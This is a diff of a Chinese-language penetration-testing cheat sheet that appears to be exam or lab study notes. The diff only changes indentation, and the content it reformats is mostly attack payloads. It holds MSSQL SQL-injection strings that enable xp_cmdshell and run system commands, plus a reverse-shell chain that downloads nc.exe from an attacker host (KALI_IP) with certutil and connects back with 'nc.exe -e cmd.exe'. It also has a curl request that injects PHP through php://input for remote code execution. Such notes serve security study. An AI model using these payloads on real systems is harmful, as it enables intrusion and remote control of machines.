@@ -245,21 +245,19 @@ date: 2024-02-07
   </details>
 
 - 各資料庫 RCE Payload
-  <details markdown="1">
-  <summary><span class="spoiler">Example</span></summary>
-  - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
+  <details markdown="1"><summary><span class="spoiler">Example</span></summary>
+    - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
+      ```sql
+      -- 啟用 xp_cmdshell
+      $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
 
-  ```sql
-  -- 啟用 xp_cmdshell
-  $ '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
+      -- 執行命令
+      $ '; EXEC xp_cmdshell 'whoami'; --
 
-  -- 執行命令
-  $ '; EXEC xp_cmdshell 'whoami'; --
-
-  -- Reverse shell
-  $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
-  $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
-  ```
+      -- Reverse shell
+      $ '; EXEC xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Windows\Temp\nc.exe'; --
+      $ '; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe'; --
+      ```
 
   - MySQL(INTO OUTFILE / UDF): FILE 權限 + secure_file_priv 沒有限制 + 知道 web 目錄絕對路徑
 
@@ -819,7 +817,8 @@ fetch(`/getflag\)
   ```bash
   $ curl -X POST "http://mountaindesserts.local/meteor/index.php?page=php://input" -d "<?php system('id'); ?>"
   ```
-  </details>
+
+</details>
 
 確認 RCE 後，送 Reverse Shell
 
